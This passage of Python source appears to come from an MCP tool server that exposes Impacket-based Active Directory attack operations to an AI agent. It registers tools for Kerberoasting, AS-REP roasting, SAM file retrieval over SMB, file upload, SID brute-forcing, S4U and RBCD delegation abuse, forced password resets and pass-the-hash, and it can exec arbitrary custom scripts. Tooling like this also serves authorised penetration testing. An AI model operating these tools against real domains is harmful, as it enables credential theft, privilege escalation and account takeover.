                    "description": "Account that does not require preauth (obtain TGS via AS-REQ)",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.kerberoast,
        )

        self.register_method(
            name="asreproast",
            description="AS-REP Roasting - extract hashes for accounts with Kerberos pre-authentication disabled",
            params={
                **self._auth_params(),
                "usersfile": {
                    "type": "string",
                    "description": "File with list of usernames to test (one per line)",
                },
                "output_format": {
                    "type": "string",
                    "enum": ["hashcat", "john"],
                    "default": "hashcat",
                    "description": "Hash output format",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.asreproast,
        )

        # ── SMB Operations ───────────────────────────────────────────────

        self.register_method(
            name="smb_shares",
            description="List SMB shares on a remote Windows host with access permissions",
            params={
                **self._auth_params(),
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.smb_shares,
        )

        self.register_method(
            name="smb_get",
            description="Download a file from an SMB share",
            params={
                **self._auth_params(),
                "share": {
                    "type": "string",
                    "required": True,
                    "description": "Share name (e.g., 'C$', 'Users', 'SYSVOL')",
                },
                "remote_path": {
                    "type": "string",
                    "required": True,
                    "description": "Path within the share (e.g., 'Windows\\System32\\config\\SAM')",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.smb_get,
        )

        self.register_method(
            name="smb_put",
            description="Upload content to an SMB share",
            params={
                **self._auth_params(),
                "share": {
                    "type": "string",
                    "required": True,
                    "description": "Share name (e.g., 'C$', 'Users')",
                },
                "remote_path": {
                    "type": "string",
                    "required": True,
                    "description": "Destination path within the share",
                },
                "content": {
                    "type": "string",
                    "required": True,
                    "description": "Content to upload",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.smb_put,
        )

        # ── Enumeration ──────────────────────────────────────────────────

        self.register_method(
            name="get_ad_users",
            description="Enumerate Active Directory users via LDAP (requires domain credentials)",
            params={
                **self._auth_params(),
                "all": {
                    "type": "boolean",
                    "default": False,
                    "description": "Return all user attributes (verbose)",
                },
                "specific_user": {
                    "type": "string",
                    "description": "Query a specific user by name",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.get_ad_users,
        )

        self.register_method(
            name="lookupsid",
            description="Brute-force SID enumeration to discover domain users, groups, and aliases",
            params={
                **self._auth_params(),
                "max_rid": {
                    "type": "integer",
                    "default": 4000,
                    "description": "Maximum RID to enumerate (default: 4000)",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.lookupsid,
        )

        # ── Kerberos ─────────────────────────────────────────────────────

        self.register_method(
            name="get_tgt",
            description="Request a Kerberos TGT and save the ccache file for pass-the-ticket attacks",
            params={
                **self._auth_params(),
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.get_tgt,
        )

        self.register_method(
            name="get_st",
            description="Request a Kerberos service ticket (TGS) via S4U2Self/S4U2Proxy for constrained delegation abuse. Saves ccache to /session/ for persistence.",
            params={
                **self._auth_params(),
                "spn": {
                    "type": "string",
                    "required": True,
                    "description": "Target SPN (e.g., 'cifs/dc.corp.local', 'http/web.corp.local')",
                },
                "impersonate": {
                    "type": "string",
                    "required": True,
                    "description": "User to impersonate via S4U2Self/S4U2Proxy (e.g., 'Administrator')",
                },
                "additional_ticket": {
                    "type": "string",
                    "description": "Path to additional ticket for S4U2Proxy (ccache file from RBCD or similar)",
                },
                "force_forwardable": {
                    "type": "boolean",
                    "default": False,
                    "description": "Force the service ticket to be forwardable (bypass delegation restrictions)",
                },
                "altservice": {
                    "type": "string",
                    "description": "Alternative service name for the ticket (e.g., 'cifs/dc.corp.local' to get CIFS access via HTTP delegation)",
                },
                "u2u": {
                    "type": "boolean",
                    "default": False,
                    "description": "Use User-to-User (U2U) Kerberos extension. Required for RBCD against accounts without SPNs.",
                },
                "self_only": {
                    "type": "boolean",
                    "default": False,
                    "description": "Only perform S4U2Self, skip S4U2Proxy. Gets a ticket for the impersonated user to the requesting account.",
                },
                "dmsa": {
                    "type": "boolean",
                    "default": False,
                    "description": "Use Delegated Managed Service Accounts (DMSA) for ticket request.",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.get_st,
        )

        self.register_method(
            name="addcomputer",
            description="Create a machine account in Active Directory for RBCD and other delegation attacks",
            params={
                **self._auth_params(),
                "computer_name": {
                    "type": "string",
                    "description": "Name for the new machine account (default: random). Do NOT include trailing '$'.",
                },
                "computer_pass": {
                    "type": "string",
                    "description": "Password for the new machine account (default: random)",
                },
                "method": {
                    "type": "enum",
                    "values": ["SAMR", "LDAPS"],
                    "default": "SAMR",
                    "description": "Creation method: SAMR (default, uses SMB) or LDAPS (uses LDAP over TLS)",
                },
                "base_dn": {
                    "type": "string",
                    "description": "Base DN for LDAPS method (e.g., 'DC=corp,DC=local'). Auto-derived from domain if omitted.",
                },
                "no_add": {
                    "type": "boolean",
                    "default": False,
                    "description": "Don't add the computer, only set its password (for existing accounts)",
                },
                "delete": {
                    "type": "boolean",
                    "default": False,
                    "description": "Delete the computer account instead of creating",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.addcomputer,
        )

        self.register_method(
            name="find_delegation",
            description="Enumerate delegation settings (unconstrained, constrained, RBCD) across all domain accounts",
            params={
                **self._auth_params(),
                "target_domain": {
                    "type": "string",
                    "description": "Different domain to query (for cross-trust enumeration)",
                },
                "filter_user": {
                    "type": "string",
                    "description": "Filter for a specific user/computer",
                },
                "include_disabled": {
                    "type": "boolean",
                    "default": False,
                    "description": "Include disabled accounts in results",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.find_delegation,
        )

        # ── RBCD & Account Modification ─────────────────────────────

        self.register_method(
            name="rbcd",
            description="Read, write, or clear Resource-Based Constrained Delegation on a computer account",
            params={
                **self._auth_params(),
                "delegate_from": {
                    "type": "string",
                    "description": "Machine account allowed to delegate (e.g., 'FAKEMACHINE$')",
                },
                "delegate_to": {
                    "type": "string",
                    "required": True,
                    "description": "Target computer to set RBCD on (e.g., 'WEB01$')",
                },
                "action": {
                    "type": "enum",
                    "values": ["read", "write", "remove", "flush"],
                    "default": "read",
                    "description": "Action: write (add delegation), read (list current), remove (remove specific), flush (clear all)",
                },
                "use_ldaps": {
                    "type": "boolean",
                    "default": False,
                    "description": "Use LDAPS instead of LDAP",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.rbcd,
        )

        self.register_method(
            name="changepasswd",
            description="Change or force-reset a domain user's password",
            params={
                **self._auth_params(),
                "new_password": {
                    "type": "string",
                    "required": True,
                    "description": "New password to set",
                },
                "altuser": {
                    "type": "string",
                    "description": "Privileged user performing the reset (for ForceChangePassword ACL abuse). Format: domain/user",
                },
                "altpass": {
                    "type": "string",
                    "description": "Password of the privileged user",
                },
                "althash": {
                    "type": "string",
                    "description": "NT hash of the privileged user (LMHASH:NTHASH or NTHASH)",
                },
                "reset": {
                    "type": "boolean",
                    "default": False,
                    "description": "Force-reset password with privileges (bypasses some password policies). Use when you have ForceChangePassword ACL.",
                },
                "protocol": {
                    "type": "enum",
                    "values": ["smb-samr", "rpc-samr", "kpasswd", "ldap"],
                    "default": "smb-samr",
                    "description": "Protocol for password change/reset",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.changepasswd,
        )

        self.register_method(
            name="addspn",
            description="Add or remove a Service Principal Name on an AD account",
            params={
                **self._auth_params(),
                "target_account": {
                    "type": "string",
                    "required": True,
                    "description": "Account to modify SPNs on (e.g., 'DC01$')",
                },
                "spn": {
                    "type": "string",
                    "required": True,
                    "description": "SPN to add/remove (e.g., 'cifs/DC01.pirate.htb')",
                },
                "action": {
                    "type": "enum",
                    "values": ["add", "remove"],
                    "default": "add",
                    "description": "Whether to add or remove the SPN",
                },
                "extra_args": {
                    "type": "string",
                    "description": "Additional CLI flags as a single string",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.addspn,
        )

        # ── Custom Script Runner ─────────────────────────────────────

        self.register_method(
            name="run_custom",
            description="Execute a custom Python script using the Impacket library. Scripts should be placed in /session/impacket-scripts/. Has access to all Impacket modules.",
            params={
                "script": {
                    "type": "string",
                    "required": True,
                    "description": "Script filename (e.g., 'my_exploit.py') or full path in /session/impacket-scripts/",
                },
                "args": {
                    "type": "string",
                    "description": "Command-line arguments to pass to the script",
                },
                "timeout": {
                    "type": "integer",
                    "default": 120,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.run_custom,
        )

        # ── Register data-driven generic methods ─────────────────────
        self._register_generic_methods()

        # ── Recipe system state ──────────────────────────────────────
        self._recipe_dir = os.environ.get("MCP_RECIPE_DIR", RECIPE_DIR)
        self._recipe_mtimes: Dict[str, float] = {}   # filepath -> mtime
        self._recipe_methods: set = set()              # method names owned by recipes

        # Load recipes on startup
        self._load_recipes()

    # ── Generic Method Registration ─────────────────────────────────────────

    def _register_generic_methods(self):
        """Register all methods defined in the IMPACKET_SCRIPTS table."""
        for script_def in IMPACKET_SCRIPTS:
            name = script_def["name"]
            auth_style = script_def.get("auth", "target")
            script_params = script_def.get("params", {})

            # Build MCP params: auth params + script-specific params + extra_args + timeout
            mcp_params = {}
            if auth_style in ("target", "domain"):
                mcp_params.update(self._auth_params())

            for pname, pdef in script_params.items():
                # Skip auth params that are already in _auth_params (only when auth was added)
                if auth_style in ("target", "domain") and pname in AUTH_PARAM_NAMES:
                    continue
                mcp_param = {
                    "type": pdef.get("type", "string"),
                    "description": pdef.get("description", ""),
                }
                if pdef.get("required"):
                    mcp_param["required"] = True
                if "default" in pdef:
                    mcp_param["default"] = pdef["default"]
                if "enum" in pdef:
                    mcp_param["enum"] = pdef["enum"]
                mcp_params[pname] = mcp_param

            mcp_params["extra_args"] = {
                "type": "string",
                "description": "Additional CLI flags as a single string",
            }
            mcp_params["timeout"] = {
                "type": "integer",
                "default": 60,
                "description": "Timeout in seconds",
            }

            # Create closure to capture script_def
            def make_handler(sd):
                async def handler(**kw):
                    return await self._run_generic(sd, **kw)
                return handler

            self.register_method(
                name=name,
                description=script_def["description"],
                params=mcp_params,
                handler=make_handler(script_def),
            )

    # ── Recipe System ──────────────────────────────────────────────────────

    def _load_recipes(self) -> None:
        """Scan the recipe directory and load new or modified recipe files.

        Each recipe file must define a module-level ``RECIPE`` dict with at
        least ``name`` (str), ``description`` (str), and ``auth`` (str).

        Recipes whose names collide with built-in (non-recipe) methods are
        skipped.  A recipe *can* replace a previously loaded recipe of the
        same name (hot-update).

        Errors in individual recipe files are logged and skipped -- they never
        crash the server.
        """
        if not os.path.isdir(self._recipe_dir):
            return

        for filename in sorted(os.listdir(self._recipe_dir)):
            if not filename.endswith(".py"):
                continue
            filepath = os.path.join(self._recipe_dir, filename)
            if not os.path.isfile(filepath):
                continue

            try:
                mtime = os.path.getmtime(filepath)
            except OSError:
                continue

            # Skip if already loaded and not modified
            if filepath in self._recipe_mtimes and self._recipe_mtimes[filepath] == mtime:
                continue

            try:
                self._load_single_recipe(filepath, mtime)
            except Exception as exc:
                self.logger.error(f"Failed to load recipe {filepath}: {exc}")

    def _load_single_recipe(self, filepath: str, mtime: float) -> None:
        """Load a single recipe file, register its method, and track mtime."""
        with open(filepath, "r") as f:
            source = f.read()

        code = compile(source, filepath, "exec")
        module = types.ModuleType(f"_recipe_impacket_{os.path.basename(filepath)[:-3]}")
        module.__file__ = filepath
        exec(code, module.__dict__)

        recipe_def = getattr(module, "RECIPE", None)
        if not isinstance(recipe_def, dict):
            self.logger.warning(f"Recipe {filepath} missing RECIPE dict, skipping")
            return

        name = recipe_def.get("name")
        if not name or not isinstance(name, str):
            self.logger.warning(f"Recipe {filepath} has invalid or missing 'name', skipping")
            return

        description = recipe_def.get("description", f"Recipe method: {name}")

        # Conflict check: don't overwrite built-in methods
        if name in self.methods and name not in self._recipe_methods:
            self.logger.warning(
                f"Recipe '{name}' from {filepath} conflicts with built-in method, skipping"
            )
            return

        auth_style = recipe_def.get("auth", "none")
        recipe_params = recipe_def.get("params", {})

        # Build MCP params: auth params (if needed) + recipe-specific params + extra_args + timeout
        mcp_params: Dict[str, Dict[str, Any]] = {}
        if auth_style in ("target", "domain"):
            mcp_params.update(self._auth_params())

        for pname, pdef in recipe_params.items():
            # Skip auth params already added
            if auth_style in ("target", "domain") and pname in AUTH_PARAM_NAMES:
                continue
            mcp_param: Dict[str, Any] = {
                "type": pdef.get("type", "string"),
                "description": pdef.get("description", ""),
            }
            if pdef.get("required"):
                mcp_param["required"] = True
            if "default" in pdef:
                mcp_param["default"] = pdef["default"]
            if "enum" in pdef:
                mcp_param["enum"] = pdef["enum"]
            mcp_params[pname] = mcp_param

        mcp_params["extra_args"] = {
            "type": "string",
            "description": "Additional CLI flags as a single string",
        }
        mcp_params["timeout"] = {
            "type": "integer",
            "default": 60,
            "description": "Timeout in seconds",
        }

        # Check for custom handler in the recipe module
        custom_handler = getattr(module, "handler", None)

        if custom_handler is not None:
            # Custom handler: wrap so it receives `server` as first arg
            def _bind_custom(h):
                async def _handler(**kwargs):
                    return await h(self, **kwargs)
                return _handler

            handler = _bind_custom(custom_handler)
        else:
            # Use the same _run_generic handler that IMPACKET_SCRIPTS uses
            binary = recipe_def.get("binary")
            script = recipe_def.get("script")
            if not binary and not script:
                self.logger.warning(
                    f"Recipe '{name}' from {filepath} has no handler, binary, or script, skipping"
                )
                return

            # Build a script_def compatible with _run_generic
            generic_def = {
                "name": name,
                "description": description,
                "auth": auth_style,
                "params": recipe_params,
            }
            if binary:
                generic_def["binary"] = binary
            if script:
                generic_def["script"] = script

            def _bind_generic(sd):
                async def _handler(**kwargs):
                    return await self._run_recipe_generic(sd, **kwargs)
                return _handler

            handler = _bind_generic(generic_def)

        self.register_method(
            name=name,
            description=description,
            params=mcp_params,
            handler=handler,
        )
        self._recipe_mtimes[filepath] = mtime
        self._recipe_methods.add(name)
        self.logger.info(f"Loaded recipe: {name} from {filepath}")

    def _maybe_reload_recipes(self) -> None:
        """Check for new, modified, or deleted recipe files and reload.

        Called before every tool call and list_tools to enable hot-reload.
        """
        if not os.path.isdir(self._recipe_dir):
            # Recipe dir was removed -- unregister all recipe methods
            if self._recipe_methods:
                for method_name in list(self._recipe_methods):
                    self.methods.pop(method_name, None)
                self._recipe_methods.clear()
                self._recipe_mtimes.clear()
            return

        # Collect current .py files on disk
        try:
            current_files = {
                os.path.join(self._recipe_dir, f)
                for f in os.listdir(self._recipe_dir)
                if f.endswith(".py") and os.path.isfile(os.path.join(self._recipe_dir, f))
            }
        except OSError:
            return

        tracked_files = set(self._recipe_mtimes.keys())

        # Detect if anything changed
        needs_scan = current_files != tracked_files
        if not needs_scan:
            for fpath in current_files:
                try:
                    if os.path.getmtime(fpath) != self._recipe_mtimes.get(fpath):
                        needs_scan = True
                        break
                except OSError:
                    needs_scan = True
                    break

        if not needs_scan:
            return

        # Unregister methods from deleted recipe files
        deleted_files = tracked_files - current_files
        if deleted_files:
            for method_name in list(self._recipe_methods):
                self.methods.pop(method_name, None)
            self._recipe_methods.clear()
            self._recipe_mtimes.clear()

        # (Re-)load all current recipe files
        self._load_recipes()

    async def _handle_tool_call(self, name, arguments):
        """Override to hot-reload recipes before dispatch."""
        self._maybe_reload_recipes()
        return await super()._handle_tool_call(name, arguments)

    def _get_tools(self):
        """Override to hot-reload recipes before listing."""
        self._maybe_reload_recipes()
        return super()._get_tools()

    async def _run_recipe_generic(self, script_def: Dict[str, Any], **kwargs) -> ToolResult:
        """Execute a recipe method using the same pattern as _run_generic.

        This is a thin wrapper around _run_generic that handles the `script`
        field (custom Python scripts run with python3 <script> instead of binary).
        """
        script_path = script_def.get("script")
        if script_path:
            # For script-based recipes, set binary to "python3" and prepend
            # the script path as a positional parameter
            modified_def = dict(script_def)
            modified_def["binary"] = "python3"
            modified_def.pop("script", None)
            # Inject the script path as the first positional arg via _subcommand
            modified_def["_subcommand"] = script_path
            return await self._run_generic(modified_def, **kwargs)
        else:
            return await self._run_generic(script_def, **kwargs)

    async def _run_generic(self, script_def: Dict[str, Any], **kwargs) -> ToolResult:
        """Execute a data-driven generic method."""
        timeout = kwargs.pop("timeout", 60)
        extra_args_str = kwargs.pop("extra_args", None)
        auth_style = script_def.get("auth", "target")

        # Extract auth kwargs (only for methods that use standard auth)
        auth_kw = {}
        if auth_style in ("target", "domain"):
            auth_kw = {k: kwargs.pop(k, None) for k in list(AUTH_PARAM_NAMES) if k in kwargs}
            # Remove None values
            auth_kw = {k: v for k, v in auth_kw.items() if v is not None}

        # Build auth args
        identity_str = ""
        auth_args = []
        if auth_style == "domain":
            identity_str, auth_args = self._build_domain_auth_args(**auth_kw)
        elif auth_style == "target":
            identity_str, auth_args = self._build_auth_args(**auth_kw)

        # Some scripts (e.g., getPac.py) don't accept -dc-ip
        if script_def.get("_no_dc_ip"):
            filtered = []
            skip_next = False
            for arg in auth_args:
                if skip_next:
                    skip_next = False
                    continue
                if arg == "-dc-ip":
                    skip_next = True
                    continue
                filtered.append(arg)
            auth_args = filtered

        # Build command
        binary = script_def.get("binary", f"impacket-{script_def['name']}")
        cmd = [binary]

        # Add subcommand if defined (e.g., dpapi backupkeys)
        subcommand = script_def.get("_subcommand")
        if subcommand and not script_def.get("_subcommand_after_identity"):
            cmd.append(subcommand)

        cmd.extend(auth_args)

        # Collect positional args (flag == ""), positional-after-identity, and
        # regular flag args.  Flag args must come AFTER identity and any
        # positional-after-identity subcommands (e.g., services/reg/net/tstool)
        # because Impacket argparse subparsers define their own flags.
        positional_args = []
        positional_after_identity = []
        flag_args = []
        script_params = script_def.get("params", {})

        for pname, value in list(kwargs.items()):
            if value is None:
                continue
            pdef = script_params.get(pname, {})
            flag = pdef.get("flag")
            if flag is None:
                # Default flag derivation
                flag = f"-{pname.replace('_', '-')}"

            if pdef.get("_positional_after_identity"):
                positional_after_identity.append(str(value))
                continue

            if flag == "":
                # Positional argument
                positional_args.append(str(value))
            elif pdef.get("type") == "boolean":
                if value:
                    flag_args.append(flag)
            else:
                flag_args.extend([flag, str(value)])

        # Append identity string (some scripts use a flag like -t instead of positional)
        identity_flag = script_def.get("_identity_flag")
        if identity_str:
            if identity_flag:
                cmd.extend([identity_flag, identity_str])
            else:
                cmd.append(identity_str)

        # Append subcommand after identity if flagged
        if subcommand and script_def.get("_subcommand_after_identity"):
            cmd.append(subcommand)

        # Append positional args after identity (e.g., action subcommands)
        for arg in positional_after_identity:
            cmd.append(arg)

        # Append flag args AFTER identity and subcommands so argparse
        # subparsers (services, reg, net, etc.) can parse them correctly
        cmd.extend(flag_args)

        # Append positional args last
        for arg in positional_args:
            cmd.append(arg)

        # Append extra_args
        if extra_args_str:
            cmd.extend(shlex.split(extra_args_str))

        # Build env
        env = {}
        kerberos = auth_kw.get("kerberos", False)
        if kerberos:
            env = self._get_auth_env()
        ccache = auth_kw.get("ccache_path")
        if ccache:
            env["KRB5CCNAME"] = ccache

        try:
            result = await self.run_command_with_progress(cmd, env=env)
            combined = result.stdout + result.stderr
            has_error = self._has_error_in_output(combined)
            success = result.returncode == 0 and not has_error

            error_class = None
            retryable = False
            suggestions = []
            error_msg = None
            if not success:
                error_class, retryable, suggestions = self._classify_error(combined)
                error_msg = combined.strip().split("\n")[-1] if combined.strip() else f"{script_def['name']} failed"

            return ToolResult(
                success=success,
                data={"command": " ".join(cmd), "method": script_def["name"]},
                raw_output=sanitize_output(combined),
                error=error_msg,
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )
        except ToolError as e:
            error_class, retryable, suggestions = self._classify_error(str(e))
            return ToolResult(
                success=False,
                data={"command": " ".join(cmd), "method": script_def["name"]},
                error=str(e),
                error_class=error_class,
                retryable=retryable,
                suggestions=suggestions,
            )

    # ── Custom Script Runner ────────────────────────────────────────────────

    async def run_custom(
        self,
        script: str,
        args: Optional[str] = None,
        timeout: int = 120,
    ) -> ToolResult:
        """Execute a custom Python script from /session/impacket-scripts/."""
        # Resolve script path
        if os.path.isabs(script):
            script_path = script
        else:
            script_path = os.path.join(CUSTOM_SCRIPT_DIR, script)

        if not os.path.exists(script_path):
            return ToolResult(
                success=False,
                data={"script": script},
                error=f"Script not found: {script_path}. Place custom scripts in {CUSTOM_SCRIPT_DIR}/",
                error_class="params",
            )

        cmd = ["python3", script_path]
        if args:
            cmd.extend(shlex.split(args))

        try:
            result = await self.run_command_with_progress(cmd)
            combined = result.stdout + result.stderr
            if result.returncode != 0:
                error_class, retryable, suggestions = self._classify_error(combined)
                return ToolResult(
                    success=False,
                    data={"script": script, "command": " ".join(cmd)},
                    raw_output=sanitize_output(combined),
                    error=combined.strip().split("\n")[-1] if combined.strip() else "Script execution failed",
                    error_class=error_class,
                    retryable=retryable,
                    suggestions=suggestions,
                )
            return ToolResult(
                success=True,
                data={"script": script, "command": " ".join(cmd)},
                raw_output=sanitize_output(combined),
            )
        except ToolError as e:
            ec, rt, sg = self._classify_error(str(e))
            return ToolResult(
                success=False,
                data={"script": script},
                error=str(e),
                error_class=ec,
                retryable=rt,
                suggestions=sg,
            )

    # ── State Management ──────────────────────────────────────────────

    def _restore_state(self):
        """Restore credential state from /session/credentials/ on container start."""
        if not os.path.isdir(CRED_DIR):
            return
        import glob as _glob
        for ccache in _glob.glob(os.path.join(CRED_DIR, "*.ccache")):
            principal = os.path.splitext(os.path.basename(ccache))[0]
            self._tickets[principal] = ccache
            self._active_principal = principal  # last one wins as default
        if os.path.exists(os.path.join(CONFIG_DIR, "krb5.conf")):
            if not os.path.exists("/etc/krb5.conf"):
                shutil.copy(os.path.join(CONFIG_DIR, "krb5.conf"), "/etc/krb5.conf")
            self._krb5_configured = True
        if self._tickets:
            self.logger.info(f"Restored {len(self._tickets)} tickets from {CRED_DIR}")

    def _save_ticket(self, principal: str, ccache_path: str):
        """Save a ticket to /session/credentials/ and track in memory."""
        os.makedirs(CRED_DIR, exist_ok=True)
        # Sanitize principal for filename
        safe_name = principal.replace("/", "_").replace("@", "_").replace("\\", "_")
        dest = os.path.join(CRED_DIR, f"{safe_name}.ccache")
        shutil.copy2(ccache_path, dest)
        self._tickets[principal] = dest
        self._active_principal = principal
        self.logger.info(f"Saved ticket for {principal} -> {dest}")

    def _get_auth_env(self, principal: str = None) -> Dict[str, str]:
        """Get env dict with KRB5CCNAME for the given (or active) principal."""
        p = principal or self._active_principal
        if p:
            ccache = self._tickets.get(p)
            if ccache and os.path.exists(ccache):
                return {"KRB5CCNAME": ccache}
        return {}

    def _ensure_krb5_conf(self, domain: str, dc_ip: str):
        """Auto-generate /etc/krb5.conf on first Kerberos call."""
        if self._krb5_configured:
            return
        realm = domain.upper()
        conf = f"""[libdefaults]
    default_realm = {realm}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true

[realms]
    {realm} = {{
        kdc = {dc_ip}
        admin_server = {dc_ip}
    }}

[domain_realm]
    .{domain.lower()} = {realm}
    {domain.lower()} = {realm}
"""
        with open("/etc/krb5.conf", "w") as f:
            f.write(conf)
        # Also save to /session/config/ for other tool containers
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(os.path.join(CONFIG_DIR, "krb5.conf"), "w") as f:
            f.write(conf)
        self._krb5_configured = True
        self.logger.info(f"Generated krb5.conf for realm {realm} (KDC: {dc_ip})")

    # ── Helpers ──────────────────────────────────────────────────────────

    def _auth_params(self, extra_params: Optional[Dict] = None) -> Dict[str, Dict[str, Any]]:
        """Return common authentication parameter definitions."""
        params = {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target IP address or hostname",
            },
            "username": {
                "type": "string",
                "description": "Username for authentication",
            },
            "password": {
                "type": "string",
                "description": "Password for authentication",
            },
            "domain": {
                "type": "string",
                "description": "Active Directory domain name (e.g., 'CORP.LOCAL')",
            },
            "hashes": {
                "type": "string",
                "description": "NTLM hash in LM:NT format for pass-the-hash (e.g., 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0')",
            },
            "kerberos": {
                "type": "boolean",
                "default": False,
                "description": "Use Kerberos authentication (requires valid ccache or TGT)",
            },
            "dc_ip": {
                "type": "string",
                "description": "Domain Controller IP (required for Kerberos and some LDAP operations)",
            },
            "aes_key": {
                "type": "string",
                "description": "AES key for Kerberos authentication (128 or 256 bit hex)",
            },
            "port": {
                "type": "integer",
                "description": "Target port (default varies by protocol: 445 for SMB, 135 for WMI/DCOM)",
            },
        }
        if extra_params:
            params.update(extra_params)
        return params

    def _build_auth_args(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        **_extra,
    ) -> tuple:
        """
        Build Impacket CLI authentication format for target-based tools.

        Returns:
            (target_str, extra_args) where target_str is '[domain/]user[:pass]@target'
            and extra_args is a list of additional CLI flags.
        """
        # Auto-generate krb5.conf if using Kerberos
        if kerberos and domain:
            self._ensure_krb5_conf(domain, dc_ip or target)

        # Build target string: [domain/]user[:password]@target
        parts = []
        if domain:
            parts.append(f"{domain}/")
        if username:
            parts.append(username)
            if password:
                parts.append(f":{password}")
        parts.append(f"@{target}")
        target_str = "".join(parts)

        extra_args = []

        if hashes:
            extra_args.extend(["-hashes", hashes])
        if kerberos:
            extra_args.append("-k")
            if not password and not hashes and not aes_key:
                extra_args.append("-no-pass")
        if dc_ip:
            extra_args.extend(["-dc-ip", dc_ip])
        if aes_key:
            extra_args.extend(["-aesKey", aes_key])
        if port is not None:
            extra_args.extend(["-port", str(port)])

        return target_str, extra_args

    def _build_domain_auth_args(
        self,
        target: str,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        hashes: Optional[str] = None,
        kerberos: bool = False,
        dc_ip: Optional[str] = None,
        aes_key: Optional[str] = None,
        port: Optional[int] = None,
        **_extra,
    ) -> tuple:
        """
        Build Impacket CLI authentication format for domain-based tools.

        Returns:
            (identity_str, extra_args) where identity_str is 'domain/user[:pass]'
            and extra_args includes -dc-ip.
        """
        # Auto-generate krb5.conf if using Kerberos
        if kerberos and domain:
            self._ensure_krb5_conf(domain, dc_ip or target)

        # Build identity string: domain/user[:password] (no @target)
        parts = []
        if domain:
            parts.append(f"{domain}/")
        if username:
            parts.append(username)
            if password:
                parts.append(f":{password}")
        identity_str = "".join(parts)

        extra_args = []

        if hashes:
            extra_args.extend(["-hashes", hashes])
        if kerberos:
            extra_args.append("-k")
            if not password and not hashes and not aes_key:
                extra_args.append("-no-pass")
        # Use explicit dc_ip if set, otherwise use target as DC IP
        effective_dc_ip = dc_ip or target
        if effective_dc_ip:
            extra_args.extend(["-dc-ip", effective_dc_ip])
        if aes_key:
            extra_args.extend(["-aesKey", aes_key])

        return identity_str, extra_args

    def _parse_extra_args(self, extra_args: Optional[str]) -> List[str]:
        """Parse extra_args string into a list of CLI arguments."""
        if not extra_args:
            return []
        return shlex.split(extra_args)

    def _parse_exec_output(self, stdout: str, stderr: str) -> Dict[str, Any]:
        """Parse output from execution commands (psexec, wmiexec, etc.)."""
        combined = stdout + stderr
        output_lines = []
        for line in combined.split("\n"):
            # Skip Impacket banner/info lines
            if line.startswith("Impacket ") or line.startswith("[*]") or line.startswith("[!]"):
                continue
            if line.strip():
                output_lines.append(line)
        return {
            "output": "\n".join(output_lines),
            "info": [l.strip() for l in combined.split("\n") if l.startswith("[*]") or l.startswith("[+]")],
            "warnings": [l.strip() for l in combined.split("\n") if l.startswith("[!]") or l.startswith("[-]")],
        }

    # ── Error Classification Helpers ─────────────────────────────────────

    # Error patterns that indicate failure even when returncode == 0.
    # Impacket scripts frequently exit 0 on auth failures, access denied, etc.
    _ERROR_PATTERNS = [
        "SessionError", "STATUS_", "KDC_ERR", "KRB_AP_ERR",
        "INSUFF_ACCESS_RIGHTS", "rpc_s_access_denied",
        "CO_E_RUNAS_LOGON_FAILURE", "REGDB_E_CLASSNOTREG",
        "ERROR_DS_DRA", "Target principal not found",
        "Kerberos SessionError", "WBEM_E_ACCESS_DENIED",
    ]

    def _has_error_in_output(self, combined: str) -> bool:
